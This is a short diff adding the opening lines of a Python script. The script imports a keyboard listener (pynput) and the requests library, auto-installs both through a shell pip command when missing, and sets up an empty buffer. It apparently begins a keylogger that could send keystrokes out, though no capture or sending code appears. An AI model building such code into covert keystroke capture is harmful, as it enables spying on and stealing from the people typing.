@@ -1,0 +1,17 @@
+import time
+import os
+import subprocess as sp
+try:
+    from pynput.keyboard import Listener
+    import requests
+
+
+except Exception:
+    proc = sp.run(
+        'pip install {} -U'.format(" ".join(['pynput', 'requests'])), text=True, shell=1)
+    from pynput.keyboard import Listener
+    import requests
+
+mem = []
+
+
